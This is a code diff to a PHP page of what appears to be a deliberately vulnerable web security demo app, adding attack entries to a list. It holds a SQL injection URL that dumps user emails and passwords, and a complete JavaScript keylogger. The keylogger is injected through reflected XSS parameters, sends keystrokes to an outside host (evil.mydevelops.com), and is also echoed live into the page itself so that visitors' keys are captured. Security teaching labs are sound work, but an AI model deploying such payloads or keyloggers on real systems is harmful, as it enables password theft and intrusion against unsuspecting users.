@@ -24,6 +24,51 @@ $attacks[2] = array(
    "attack" => "product.php?id=-1%27%20UNION%20SELECT%20email%20as%20id,%20email%20as%20name,%20pw%20as%20description,%20email%20as%20price,%20email%20as%20secret,%20email%20as%20hidden%20FROM%20users--"
 );
 
+$xss = '
+var buffer = [];
+var data;
+var x = String(/http:\/\/evil.mydevelops.com?c=/);
+attacker = x.substring(1, x.length-1);
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+};
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker.concat(data);
+        buffer = [];
+    }
+}, 200);
+';
+
+//$xss = trim(preg_replace('/\s\s+/', ' ', $xss));
+
+$attacks[3] = array(
+    "name" => "XSS attack",
+    "description" => "Log your pressed keys",
+   "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+   "attack" => "listing.php?search=No risk, No fun. I don recommend using this app, because it can be harmfull!<script>".$xss."</script>"
+);
+
+$attacks[4] = array(
+    "name" => "XSS attack",
+    "description" => "Steal your password on login site!",
+   "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+   "attack" => "http://chichichacha.local/websecurity/vulnerable_web_application/index.php?message=<script>".$xss."</script>"
+);
+
+
+
+echo "<script>".$xss."</script>";
+
+
 ?>
 
 <?php
@@ -32,17 +77,10 @@ include_once("header.php");
 
 <div class="row listing-row">
 	<div class="col s12 m10 offset-m1 ">  
-		<div class="card-panel">     
-			<h4>Search results for: <?=$search?></h4>
+		<div class="card-panel">   
+			<h4>Make some nice attack</h4>  
             <table class=" highlight stripped responsive-table listing">
-                <thead>
-                    <tr>
-                        <th data-field="name">Name</th>
-                        <th data-field="description">Description</th>
-                        <th data-field="value">Value</th>
-                        <th data-field="attack">Attack!</th>
-                    </tr>
-                </thead>
+               
                 <tbody>
                     <?php foreach($attacks as $attack): ?>
                         <tr>
